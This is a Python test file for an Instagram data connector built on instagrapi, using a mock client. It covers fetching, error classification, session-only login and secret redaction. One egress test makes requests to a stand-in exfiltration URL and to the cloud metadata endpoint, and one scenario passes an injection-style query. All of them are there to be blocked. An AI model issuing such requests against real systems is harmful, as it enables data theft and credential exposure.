"""I-19 contract + keamanan connector instagrapi.instagram — client instagrapi TIRUAN (CI tidak pernah login ke Instagram)."""
import json
from datetime import datetime, timezone
from types import SimpleNamespace

import pytest
import requests
from instagrapi import exceptions as ex

from smip_fetch.connector import Credential, FetchRequest, Query
from smip_fetch.connectors.instagrapi_instagram import IG_HOSTS, InstagrapiInstagram, guard_session, normalize
from smip_fetch.contract import Harness, Scenario, check_deadline, check_manifest, check_no_secret_leak, context, run_scenario
from smip_fetch.errors import ConnectorError

SESSIONID = "1234567%3AsEsIrAhAsIa%3A12%3AAYc-secret"
SETTINGS = json.dumps({"authorization_data": {"sessionid": SESSIONID}, "uuids": {}, "cookies": {"sessionid": SESSIONID}})


def media(code, n, at=datetime(2026, 9, 29, 3, 0, tzinfo=timezone.utc), **over):
    m = SimpleNamespace(
        code=code,
        pk=str(3000 + n),
        taken_at=at,
        user=SimpleNamespace(pk=900 + n, username=f"akun{n}", full_name=f"Akun {n}", is_verified=False),
        caption_text=f"Kopdes merah putih #KopDes #desa{n}",
        like_count=10 + n,
        comment_count=n,
        play_count=None,
        view_count=None,
        like_and_view_counts_disabled=False,
        media_type=1,
        thumbnail_url=f"https://scontent.cdninstagram.com/{code}.jpg",
    )
    for k, v in over.items():
        setattr(m, k, v)
    return m


class FakeClient:
    """Permukaan instagrapi.Client yang dipakai connector. `mode` mensimulasikan exception library."""

    mode = "ok"
    logins: list = []

    def __init__(self):
        self.private = requests.Session()
        self.public = requests.Session()
        self.delay_range = [1, 3]
        self.request_timeout = 1
        self.settings = None

    def set_settings(self, s):
        self.settings = s
        return True

    def login_by_sessionid(self, sid):
        FakeClient.logins.append("sessionid")
        return True

    def login(self, *a, **k):  # pragma: no cover - tidak boleh dipanggil
        raise AssertionError("login password dilarang")

    def set_locale(self, v):
        self.locale = v

    def set_timezone_offset(self, v):
        self.tz = v

    def set_proxy(self, v):
        self.proxy = v

    def _maybe_fail(self):
        m = FakeClient.mode
        if m == "challenge":
            raise ex.ChallengeRequired(message=f"challenge sessionid={SESSIONID}")
        if m == "login":
            raise ex.LoginRequired()
        if m == "throttle":
            raise ex.PleaseWaitFewMinutes()
        if m == "blocked":
            raise ex.SentryBlock()
        if m == "boom":
            raise RuntimeError("tak terduga")

    def hashtag_medias_paginated_v1(self, name, amount=27, tab_key="recent", end_cursor=None):
        self._maybe_fail()
        self.last = ("hashtag", name, amount, tab_key, end_cursor)
        old = media("OLDxxxxx", 9, at=datetime(2026, 9, 1, tzinfo=timezone.utc))
        return [media("Cabc12345", 1), media("Cdef67890", 2, like_and_view_counts_disabled=True), old], "next-1"

    def user_medias_paginated_v1(self, user_id, amount=33, end_cursor=""):
        self._maybe_fail()
        return [media("Cuser0001", 3)], ""

    def media_pk_from_code(self, code):
        return f"pk-{code}"

    def media_info_v1(self, pk):
        self._maybe_fail()
        return media(pk.removeprefix("pk-"), 4)


conn = InstagrapiInstagram(client_factory=FakeClient)


def req(**over):
    base = dict(
        request_id="0192f000-0000-7000-8000-000000000001",
        idempotency_key="run.ig.attempt.1.q0.page.1",
        platform="instagram",
        operation="search_hashtag",
        page_limit=1,
        max_items=20,
        query=Query("#KopDes", []),
        since="2026-09-28T00:00:00.000Z",
    )
    base.update(over)
    return FetchRequest(**base)


def mode(m):
    return lambda: setattr(FakeClient, "mode", m)


H = Harness(
    connector=conn,
    credential=Credential("session", {"settings": SETTINGS}),
    config={"delay_range": [2, 5], "locale": "id_ID"},
    secret_values=[SESSIONID],
    scenarios=[
        Scenario("hashtag sukses", req(), "ok", mode("ok")),
        Scenario("user timeline", req(operation="user_timeline", query=None, target_ids=["1234"]), "ok", mode("ok")),
        Scenario("post detail", req(operation="post_detail", query=None, target_ids=["Cabc12345"], since=None), "ok", mode("ok")),
        Scenario("challenge", req(), "CHALLENGE_REQUIRED", mode("challenge")),
        Scenario("sesi kedaluwarsa", req(), "AUTH_INVALID", mode("login")),
        Scenario("throttle", req(), "RATE_LIMITED", mode("throttle")),
        Scenario("diblokir", req(), "BLOCKED", mode("blocked")),
        Scenario("error mentah library", req(), "UNKNOWN", mode("boom")),
        Scenario("keyword tak didukung", req(operation="search_keyword"), "NOT_SUPPORTED", mode("ok")),
        Scenario("hashtag tidak valid", req(query=Query("a b; drop", [])), "INVALID_QUERY", mode("ok")),
    ],
)


def test_manifest_unofficial_standby_rules():
    check_manifest(conn)
    m = conn.manifest
    assert m.provider_kind == "unofficial" and m.exclusive_session and m.credential_kinds == ["session"]
    assert "search_keyword" not in m.operations


@pytest.mark.parametrize("s", H.scenarios, ids=lambda s: s.name)
async def test_scenario(s):
    await run_scenario(H, s)


async def test_deadline():
    FakeClient.mode = "ok"
    await check_deadline(H)


def test_no_secret_leak():
    check_no_secret_leak(H)


async def test_hashtag_normalization_and_window():
    FakeClient.mode = "ok"
    ctx, _ = context(H)
    r = await conn.fetch(req(), ctx)
    assert [i["platform_post_id"] for i in r.items] == ["Cabc12345", "Cdef67890"]  # post lama di luar window dibuang
    assert r.usage.results == 3 and r.next_cursor == "next-1" and r.has_more
    a, b = r.items
    assert a["url"] == "https://www.instagram.com/p/Cabc12345/" and a["author"]["platform_user_id"] == "901"
    assert a["hashtags"] == ["desa1", "kopdes"] and a["metrics"]["likes"] == 11
    assert b["metrics"]["likes"] is None  # like disembunyikan → tidak diketahui (bukan 0)
    assert a["author"]["followers"] is None


async def test_session_only_no_password_login():
    FakeClient.mode = "ok"
    h = Harness(conn, Credential("session", {"username": "x", "password": "y"}), {}, [], [])
    ctx, _ = context(h)
    with pytest.raises(ConnectorError) as e:
        await conn.fetch(req(), ctx)
    assert e.value.code == "AUTH_INVALID"
    FakeClient.logins.clear()
    ctx, _ = context(Harness(conn, Credential("session", {"sessionid": SESSIONID}), {}, [], []))
    await conn.fetch(req(), ctx)
    assert FakeClient.logins == ["sessionid"]


def test_challenge_message_has_no_secret():
    from smip_fetch.connectors.instagrapi_instagram import classify

    e = classify(ex.ChallengeRequired(message=f"x sessionid={SESSIONID}"))
    assert e.code == "CHALLENGE_REQUIRED" and SESSIONID not in e.message and e.scope == "account"


def test_egress_guard_blocks_foreign_hosts():
    s = requests.Session()
    guard_session(s, IG_HOSTS)
    with pytest.raises(ConnectorError) as e:
        s.get("https://evil.example.com/steal")
    assert e.value.code == "FORBIDDEN"
    with pytest.raises(ConnectorError):
        s.get("http://169.254.169.254/latest/meta-data")


def test_naive_time_rejected():
    assert normalize(media("Cnaive001", 1, at=datetime(2026, 9, 29, 3, 0)), "2026-09-29T04:00:00.000Z", None) is None
